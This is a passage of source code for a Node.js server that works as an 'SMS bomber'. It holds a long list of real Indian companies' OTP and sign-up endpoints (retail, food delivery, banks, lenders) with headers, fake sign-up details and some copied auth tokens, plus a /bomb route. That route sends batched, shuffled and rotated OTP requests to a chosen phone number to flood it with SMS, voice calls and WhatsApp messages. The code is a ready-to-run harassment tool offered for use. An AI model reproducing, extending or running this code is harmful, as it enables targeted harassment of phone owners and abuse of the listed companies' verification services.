        url: "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
        headers: {
            "appVersion": "8.9.0",
            "CONTENT_TYPE": "application/json",
            "channel": "gaana.com",
            "tgid": "j9qcq0z2ur4llq2a58qqmag2",
            "sdkVersion": "1.0",
            "appVersionCode": "933",
            "deviceId": "j9qcq0z2ur4llq2a58qqmag2",
            "platform": "android",
            "sdkVersionCode": "1",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        data: { "mobile": "91-{phone}" }
    },
    {
        name: "Ajio_2",
        method: "POST",
        url: "https://login.web.ajio.com/api/auth/signupSendOTP",
        headers: {
            "accept": "application/json",
            "Origin": "https://www.ajio.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Referer": "https://www.ajio.com/signup?referrer=/my-account/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US"
        },
        data: { "firstName": "Tsunami Bomber", "login": "tsunami@gmail.com", "password": "kd34646@3131nxnxn", "genderType": "", "mobileNumber": "{phone}", "requestType": "SENDOTP" }
    },
    {
        name: "EasyMyTrip",
        method: "POST",
        url: "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
        headers: {
            "accept": "text/plain, */*; q=0.01",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://mybookings.easemytrip.com",
            "referer": "https://mybookings.easemytrip.com/MyBooking/Profile",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "emailph": "{phone}" }
    },
    {
        name: "Kotak_1",
        method: "POST",
        url: "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.kotak.com",
            "Referer": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={phone}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes" }
    },
    {
        name: "Licious",
        url: "https://www.licious.in/api/login/signup", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://www.licious.in", "Referer": "https://www.licious.in/" },
        data: (phone) => JSON.stringify({ phone: phone, captcha_token: null })
    },
    {
        name: "SabkaLoan", url: "https://api.sabkaloan.com/api/send-otp", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://sabkaloan.com", "Referer": "https://sabkaloan.com/" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Jockey",
        method: "GET",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },
    {
        name: "PharmEasy_NEW", method: "POST",
        url: "https://pharmeasy.in/api/auth/requestOTP",
        headers: {
            "Host": "pharmeasy.in",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
            "Accept": "*/*", "Content-Type": "application/json"
        },
        data: { "contactNumber": "{phone}" }
    },
    {
        name: "Sephora", url: "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869", method: "POST",
        headers: { "Content-Type": "application/json", "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==", "x-fp-signature": "v1.1:82658e094becb14ba6a75fcca29dd5e7f1cb0767978485c12185178ff7ad198b", "x-fp-date": "20260108T112314Z", "x-fp-sdk-version": "3.3.2", "Origin": "https://sephora.in", "Referer": "https://sephora.in/" },
        data: (phone) => JSON.stringify({ mobile: phone, country_code: "91" })
    },
    {
        name: "Tyreplex2_WA",
        method: "POST",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Hungama_Verified",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "country_code": "IN",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/"
        },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", emailId: "", subject: "Register", priority: "1", device: "web", variant: "v1", templateCode: 1 })
    },
    {
        name: "KPNFresh_Verified",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        method: "POST",
        headers: { "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "content-type": "application/json", "origin": "https://www.kpnfresh.com", "referer": "https://www.kpnfresh.com/" },
        data: (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" } })
    },

    // ============================================================
    // ✅ NAYI WORKING APIs (from stats)
    // ============================================================
    {
        name: "NewMe SMS",
        url: "https://prodapi.newme.asia/web/otp/request",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile_number": phone, "resend_otp_request": true})
    },
    {
        name: "Smytten SMS",
        url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        method: "POST",
        headers: {"Content-Type": "application/json", "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},
        data: (phone) => JSON.stringify({"phone": phone, "email": "sdhabai09@gmail.com"})
    },
    {
        name: "Country Delight",
        url: "https://api.countrydelight.in/api/v1/customer/requestOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "platform": "Android", "mode": "new_user"})
    },
    {
        name: "Licius",
        url: "https://www.licious.in/api/login/signup",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "captcha_token": null})
    },
    {
        name: "Breeze Session",
        url: "https://api.breeze.in/session/start",
        method: "POST",
        headers: {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "authVerificationType": "otp", "countryCode": "+91"})
    },
    {
        name: "IIFL SMS",
        url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data: { "_raw": "apply_for=18&full_name=Test&mobile_number={phone}&terms_and_condition=1&_drupal_ajax=1" }
    },
    {
        name: "Tata Capital Retail SMS",
        url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"header": {"authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", "identifier": "nli"}, "body": {"mobileNumber": phone}})
    },
    {
        name: "AstroSage SMS",
        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "Zerodha SMS",
        url: "https://zerodha.com/account/registration.php",
        method: "POST",
        headers: {"Content-Type": "application/json;charset=UTF-8"},
        data: (phone) => JSON.stringify({"mobile": phone, "source": "zerodha", "partner_id": ""})
    },
    {
        name: "TyrePlex SMS",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Zomato Login SMS",
        url: "https://www.zomato.com/php/asyncLogin.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "phone={phone}&type=sms" }
    },
    {
        name: "Ullu SMS",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        method: "POST",
        headers: {}
    },
    {
        name: "Ogonn SMS",
        url: "https://ogonn.in/otp",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "Aakash Digital SMS",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobileval={phone}" }
    },
    {
        name: "BigCash SMS",
        url: "https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        method: "GET",
        headers: {"Referer": "https://www.bigcash.live/games/poker"}
    },
    {
        name: "RedBus OTP",
        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91",
        method: "GET",
        headers: {}
    },
    {
        name: "Jockey SMS",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
        method: "GET",
        headers: {}
    },
    {
        name: "RupeeLending",
        url: "https://rupeelending.com/apply-now/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "BrightLoans",
        url: "https://brightloans.in/login-sbm",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" }
    },
    {
        name: "TataCapital PL",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobileNumber": phone, "deviceOS": "Web", "applSource": "PL"})
    },
    {
        name: "Moglix V2",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2",
        method: "POST",
        headers: {"Content-Type": "application/json", "x-platform": "PWA"},
        data: (phone) => JSON.stringify({"email": "", "phone": phone, "type": "p", "source": "signup", "buildVersion": "37.3.1"})
    },
    {
        name: "MyMoneyBazaar",
        url: "https://mm-app-backend.mymoneybazaar.com/api/v2/authentication/phone_no_verify/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone})
    },
    {
        name: "Decathlon",
        url: "https://www.decathlon.in/api/v1/auth/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "isLogin": true})
    },
    {
        name: "PocketMoney SMS",
        url: "https://api2.the-pocket-money.com/pokktmoney/send_verification_code?verification_phone={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "Refyne SMS",
        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "SMS", "recipient": phone})
    },
    {
        name: "HERE SMS",
        url: "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "source": "sms"})
    },
    {
        name: "VisitApp SMS",
        url: "https://api.getvisitapp.com/v3/new-auth/login-phone",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "countryCode": 91, "platform": "WEB"})
    },
    {
        name: "Sulekha",
        url: "https://myaccount.sulekha.com/network/userauthv1.aspx",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "Country Delight GET",
        url: "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Eka Care",
        url: "https://auth.eka.care/auth/resend",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Planet Fashion",
        url: "https://www.planetfashion.in/login/resendOTP?isAjax=true",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "OkCredit",
        url: "https://web.okcredit.in/api/authn/v1.0/otp:request",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Naaptol SMS",
        url: "https://m.naaptol.com/faces/jsp/ajax/ajax.jsp",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "MobiKwik SMS",
        url: "https://www.mobikwik.com/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Shopclues SMS",
        url: "https://www.shopclues.com/api/v1/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Myntra SMS",
        url: "https://www.myntra.com/gw/mobile-auth/otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "PharmEasy New",
        url: "https://pharmeasy.in/api/auth/requestOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Delhivery Direct",
        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Coursera SMS",
        url: "https://www.coursera.org/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Pay Amazon SMS",
        url: "https://pay.amazon.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Kotak Bank SMS",
        url: "https://www.kotak.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Axis Bank SMS",
        url: "https://www.axisbank.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "IndusInd SMS",
        url: "https://www.indusind.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Federal Bank SMS",
        url: "https://www.federalbank.co.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Indian Bank SMS",
        url: "https://www.indianbank.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Decathlon SMS",
        url: "https://www.decathlon.in/api/v1/auth/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "isLogin": true})
    },

    // ============================================================
    // ✅ NAYI 12 APIs - SIRF WORKING WALE
    // ============================================================
    {
        name: "Hungama_NEW_1",
        method: "POST",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "country_code": "IN",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/"
        },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", emailId: "", subject: "Register", priority: "1", device: "web", variant: "v1", templateCode: 1 })
    },
    {
        name: "TataCapital_Voice_NEW",
        method: "POST",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" })
    },
    {
        name: "KPNFresh_v2_NEW",
        method: "POST",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        headers: {
            "cache": "no-store",
            "x-channel-id": "WEB",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.kpnfresh.com",
            "referer": "https://www.kpnfresh.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" } })
    },
    {
        name: "ServeTel_v2_NEW",
        method: "POST",
        url: "https://api.servetel.in/v1/auth/otp",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)"
        },
        data: { "_raw": "mobile_number={phone}" }
    }
];

// ============================================================
// ===== STATS & LOGGING =====
// ============================================================

const stats = {};
const recentLogs = [];
const MAX_LOGS = 500;

APIS.forEach(api => {
    stats[api.name] = {
        name: api.name,
        total: 0,
        working_2xx: 0,
        rate_limited_429: 0,
        rejected_4xx: 0,
        failed_5xx: 0,
        network_error: 0,
        lastStatus: null,
        lastStatusCode: null,
        lastTime: null,
        lastError: null,
        avgResponseTime: 0
    };
});

function logEvent(msg, type = 'info') {
    const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️', rl: '🚫' }[type] || 'ℹ️';
    console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);
    recentLogs.push({ time: new Date().toISOString(), type, msg });
    if (recentLogs.length > MAX_LOGS) recentLogs.shift();
}

function recordResult(apiName, category, statusCode, responseTime, error = null) {
    const s = stats[apiName];
    if (!s) return;
    s.total++;
    if (category === 'success') { s.working_2xx++; s.lastStatus = 'WORKING'; }
    else if (category === 'ratelimit') { s.rate_limited_429++; s.lastStatus = 'RATE_LIMITED'; }
    else if (category === 'rejected') { s.rejected_4xx++; s.lastStatus = 'REJECTED'; }
    else if (category === 'fail5xx') { s.failed_5xx++; s.lastStatus = 'FAILED_5XX'; }
    else { s.network_error++; s.lastStatus = 'NETWORK_ERROR'; }
    s.lastStatusCode = statusCode;
    s.lastTime = new Date().toISOString();
    s.lastError = error;
    s.avgResponseTime = s.avgResponseTime === 0 ? responseTime : Math.round((s.avgResponseTime * (s.total - 1) + responseTime) / s.total);
}

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') data = api.data(phone);
            else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') rawData = rawData.replace(/{phone}/g, phone);
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) newObj[key] = replacePhone(obj[key]);
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = JSON.stringify({ mobile: phone });
        }

        const method = api.method.toLowerCase();
        const config = { method, url, headers, timeout: API_TIMEOUT_MS, validateStatus: () => true };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{') && !data.startsWith('[')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        const st = response.status;

        if (st >= 200 && st < 300) {
            recordResult(api.name, 'success', st, responseTime);
            logEvent(`${api.name} → ${st} (${responseTime}ms) ✅`, 'success');
            return { status: st, success: true, category: 'success', responseTime };
        } else if (st === 429) {
            recordResult(api.name, 'ratelimit', st, responseTime);
            logEvent(`${api.name} → 429 RL (${responseTime}ms)`, 'rl');
            return { status: st, success: false, category: 'ratelimit', responseTime };
        } else if (st >= 400 && st < 500) {
            recordResult(api.name, 'rejected', st, responseTime);
            logEvent(`${api.name} → ${st} REJECTED (${responseTime}ms)`, 'warn');
            return { status: st, success: false, category: 'rejected', responseTime };
        } else {
            recordResult(api.name, 'fail5xx', st, responseTime);
            logEvent(`${api.name} → ${st} 5XX (${responseTime}ms)`, 'error');
            return { status: st, success: false, category: 'fail5xx', responseTime };
        }
    } catch (err) {
        const responseTime = Date.now() - startTime;
        const errMsg = err.code || err.message || 'Unknown';

        if (retryCount < 1 && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }

        recordResult(api.name, 'network', null, responseTime, errMsg);
        logEvent(`${api.name} → NETWORK_FAIL (${responseTime}ms) ${errMsg}`, 'error');
        return { status: null, success: false, category: 'network', responseTime, error: errMsg };
    }
}

// ============================================================
// ===== ROTATION HELPER =====
// ============================================================

function rotateAPIs(apis, offset) {
    const safeOffset = ((offset % apis.length) + apis.length) % apis.length;
    return [
        ...apis.slice(safeOffset),
        ...apis.slice(0, safeOffset)
    ];
}

// ============================================================
// ===== BOMBING LOGIC (⚡ FAST + OFFSET ROTATION) =====
// ============================================================

async function runBombing(phone, effectiveDuration, apisToUse) {
    const startTime = Date.now();
    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
    let rateLimited = 0, rejected = 0, failed = 0;

    // ⚡ maxRequests = apisToUse.length × 3-5
    let maxRequests = apisToUse.length * 3;
    if (effectiveDuration <= 1) maxRequests = apisToUse.length * 5;
    else if (effectiveDuration <= 5) maxRequests = apisToUse.length * 4;
    else if (effectiveDuration <= 10) maxRequests = apisToUse.length * 3;

    // Shuffle apisToUse
    const shuffled = [...apisToUse];
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }

    console.log(`📋 APIs in pool: ${shuffled.length} | maxRequests: ${maxRequests}`);

    let sent = 0;

    for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
        const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
        const results = await Promise.allSettled(batch.map(api => makeApiCall(api, phone)));

        for (let k = 0; k < results.length; k++) {
            const result = results[k];
            const api = batch[k];
            if (result.status === 'fulfilled' && result.value) {
                const v = result.value;
                if (v.success) {
                    success++;
                    sent++;
                    const apiName = api.name || '';
                    const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                    const isWhatsapp = apiName.toLowerCase().includes('whatsapp') || apiName.toLowerCase().includes('_wa');
                    if (isCall) callCount++;
                    else if (isWhatsapp) whatsappCount++;
                    else smsCount++;
                } else if (v.category === 'ratelimit') rateLimited++;
                else if (v.category === 'rejected') rejected++;
                else failed++;
            }
        }

        if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
            await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
        }
    }

    const elapsed = (Date.now() - startTime) / 1000;
    return { success, smsCount, callCount, whatsappCount, rateLimited, rejected, failed, elapsed: elapsed.toFixed(1) };
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        total_apis: APIS.length,
        note: '134 Working APIs + OFFSET ROTATION',
        max_duration_min: MAX_DURATION_MIN,
        uptime: Math.round(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), apis: APIS.length });
});

app.get('/test', async (req, res) => {
    const phone = req.query.phone || '9999999999';
    logEvent(`🧪 Testing all APIs with ${phone}...`, 'info');
    const results = [];
    for (const api of APIS) {
        const r = await makeApiCall(api, phone);
        results.push({ name: api.name, ...r });
        await new Promise(r => setTimeout(r, 150));
    }
    const working = results.filter(r => r.success).length;
    logEvent(`🧪 Test done: ${working} OK`, 'info');
    res.json({ phone, total: results.length, working, results });
});

app.get('/stats', (req, res) => {
    const arr = Object.values(stats).map(s => {
        let status = 'NEVER TESTED';
        if (s.total > 0) {
            if (s.working_2xx > 0) status = 'WORKING';
            else if (s.rate_limited_429 > 0) status = 'RATE_LIMITED';
            else if (s.rejected_4xx > 0) status = 'REJECTED';
            else status = 'FAILED';
        }
        return {
            name: s.name,
            total: s.total,
            working_2xx: s.working_2xx,
            rate_limited_429: s.rate_limited_429,
            rejected_4xx: s.rejected_4xx,
            failed_5xx: s.failed_5xx,
            network_error: s.network_error,
            successRate: s.total > 0 ? ((s.working_2xx / s.total) * 100).toFixed(1) + '%' : 'N/A',
            status,
            lastStatusCode: s.lastStatusCode,
            lastError: s.lastError,
            avgResponseTime: s.avgResponseTime + 'ms'
        };
    });
    res.json({
        summary: {
            total: arr.length,
            working: arr.filter(a => a.status === 'WORKING').length,
            rate_limited: arr.filter(a => a.status === 'RATE_LIMITED').length,
            rejected: arr.filter(a => a.status === 'REJECTED').length,
            failed: arr.filter(a => a.status === 'FAILED').length,
            untested: arr.filter(a => a.status === 'NEVER TESTED').length
        },
        apis: arr
    });
});

app.get('/logs', (req, res) => {
    res.json({ count: recentLogs.length, logs: recentLogs.slice(-100).reverse() });
});

app.get('/reset-stats', (req, res) => {
    for (const key in stats) {
        stats[key] = { 
            name: stats[key].name, total: 0, working_2xx: 0, rate_limited_429: 0, 
            rejected_4xx: 0, failed_5xx: 0, network_error: 0, lastStatus: null, 
            lastStatusCode: null, lastTime: null, lastError: null, avgResponseTime: 0
        };
    }
    recentLogs.length = 0;
    logEvent('Stats reset', 'warn');
    res.json({ success: true });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance, offset = 0 } = req.body;   // ⚡ offset add
    if (!phone || phone.length !== 10) return res.status(400).json({ error: 'Invalid phone number.' });

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    // ⚡ Offset ke hisaab se APIs rotate karo
    const rotatedAPIS = rotateAPIs(APIS, offset);
    
    // ⚡ Sirf 10 APIs use karo
    const apisToUse = rotatedAPIS.slice(0, APIS_PER_CALL);

    console.log(`\n📱 Bombing ${phone} | Offset: ${offset} | Using APIs from position ${offset % APIS.length}`);

    try {
        const result = await runBombing(phone, effectiveDuration, apisToUse);
        console.log(`✅ DONE | ${phone} | OK: ${result.success} | RL: ${result.rateLimited} | Rejected: ${result.rejected} | Failed: ${result.failed} | ${result.elapsed}s\n`);
        res.json({
            success: true, phone,
            offset_used: offset,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: result.success,
            sms: result.smsCount,
            calls: result.callCount,
            whatsapp: result.whatsappCount,
            rate_limited: result.rateLimited,
            rejected: result.rejected,
            failed: result.failed,
            elapsed: result.elapsed + 's',
            total_apis: APIS.length,
            apis_used: apisToUse.length
        });
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: APIS.length,
        note: '134 Working APIs + OFFSET ROTATION',
        api_names: APIS.map(a => a.name)
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════');
    console.log(`🚀 API Server on port ${PORT}`);
